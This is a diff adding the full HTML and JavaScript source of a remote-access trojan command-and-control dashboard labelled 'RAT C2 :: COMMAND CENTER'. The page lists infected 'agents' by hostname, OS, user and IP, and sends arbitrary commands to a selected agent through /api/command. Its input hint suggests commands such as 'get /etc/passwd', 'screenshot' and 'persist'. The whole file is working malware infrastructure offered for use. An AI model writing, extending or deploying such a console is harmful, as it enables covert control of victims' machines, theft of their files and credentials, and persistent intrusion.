@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>RAT C2 :: Dashboard</title>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Tahoma,sans-serif}
+body{background:#0a0e14;color:#c8d4e0;height:100vh;display:flex;overflow:hidden}
+#sidebar{width:320px;background:#0d141c;border-left:1px solid #1c2733;overflow-y:auto}
+#sidebar h2{padding:16px;font-size:14px;color:#4a9eff;border-bottom:1px solid #1c2733;letter-spacing:1px}
+.agent{padding:12px 16px;border-bottom:1px solid #141c26;cursor:pointer;transition:.15s}
+.agent:hover{background:#141e2a}
+.agent.active{background:#1a2635;border-right:3px solid #4a9eff}
+.agent .name{font-weight:600;font-size:13px;color:#e0e8f0}
+.agent .meta{font-size:11px;color:#5a6b7c;margin-top:3px}
+.agent .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-left:6px}
+.online{background:#2ecc71;box-shadow:0 0 6px #2ecc71}
+.offline{background:#e74c3c}
+#main{flex:1;display:flex;flex-direction:column}
+#header{padding:14px 20px;background:#0d141c;border-bottom:1px solid #1c2733;
+        display:flex;justify-content:space-between;align-items:center}
+#header h1{font-size:15px;color:#4a9eff;letter-spacing:1px}
+#term{flex:1;background:#06090d;padding:16px;overflow-y:auto;font-family:'Consolas',monospace;
+      font-size:13px;white-space:pre-wrap;word-break:break-all;line-height:1.5}
+.cmd{color:#4a9eff}.out{color:#c8d4e0}.err{color:#e74c3c}.sys{color:#5a6b7c;font-style:italic}
+#inputbar{display:flex;border-top:1px solid #1c2733}
+#cmd{flex:1;background:#0d141c;border:none;color:#e0e8f0;padding:14px 18px;
+     font-family:'Consolas',monospace;font-size:13px;outline:none}
+#send{background:#1a2635;color:#4a9eff;border:none;padding:0 24px;cursor:pointer;
+      font-weight:600;letter-spacing:1px}
+#send:hover{background:#243447}
+</style>
+</head>
+<body>
+<div id="sidebar">
+  <h2>◈ AGENTS</h2>
+  <div id="agentlist"></div>
+</div>
+<div id="main">
+  <div id="header">
+    <h1>RAT C2 :: COMMAND CENTER</h1>
+    <span id="status" style="font-size:12px;color:#5a6b7c">disconnected</span>
+  </div>
+  <div id="term"><span class="sys">[system] select an agent from the left panel.</span></div>
+  <div id="inputbar">
+    <input id="cmd" placeholder="exec whoami  |  ls /  |  get /etc/passwd  |  screenshot  |  persist" autocomplete="off">
+    <button id="send">EXEC</button>
+  </div>
+</div>
+<script>
+let socket = io();
+let current = null;
+let agents = {};
+
+socket.on('connect', ()=>{ document.getElementById('status').textContent='connected'; document.getElementById('status').style.color='#2ecc71'; });
+socket.on('disconnect', ()=>{ document.getElementById('status').textContent='disconnected'; document.getElementById('status').style.color='#e74c3c'; });
+socket.on('agents_update', loadAgents);
+
+function loadAgents(){
+  fetch('/api/agents').then(r=>r.json()).then(list=>{
+    agents = {}; const box = document.getElementById('agentlist'); box.innerHTML='';
+    if(!list.length){ box.innerHTML='<div style="padding:16px;color:#5a6b7c;font-size:12px">no agents online</div>'; return; }
+    list.forEach(a=>{
+      agents[a.id]=a;
+      const d=document.createElement('div');
+      d.className='agent'+(current===a.id?' active':'');
+      d.onclick=()=>selectAgent(a.id);
+      d.innerHTML=`<div class="name">${a.hostname||a.id}<span class="dot ${a.alive?'online':'offline'}"></span></div>
+                   <div class="meta">${a.os||''} · ${a.user||''}</div>
+                   <div class="meta">${a.ip||''} · ${(a.last_seen||'').substring(11,19)}</div>`;
+      box.appendChild(d);
+    });
+  });
+}
+function selectAgent(id){
+  current=id; document.querySelectorAll('.agent').forEach(e=>e.classList.remove('active'));
+  loadAgents();
+  const a=agents[id];
+  print('sys', `── agent ${a.hostname} (${a.os}) @ ${a.ip} ──`);
+}
+function print(cls, txt){
+  const t=document.getElementById('term');
+  const s=document.createElement('div'); s.className=cls; s.textContent=txt;
+  t.appendChild(s); t.scrollTop=t.scrollHeight;
+}
+function exec(){
+  const inp=document.getElementById('cmd');
+  const cmd=inp.value.trim(); if(!cmd) return;
+  if(!current){ print('err','[!] select an agent first'); return; }
+  print('cmd', `$ ${cmd}`);
+  inp.value='';
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({agent_id:current,cmd})})
+    .then(r=>r.json()).then(d=>{
+      if(d.output!==undefined) print('out', d.output);
+      else print('err', d.error||'unknown error');
+    }).catch(e=>print('err', e.toString()));
+}
+document.getElementById('send').onclick=exec;
+document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')exec();});
+loadAgents();
+</script>
+</body>
+</html>
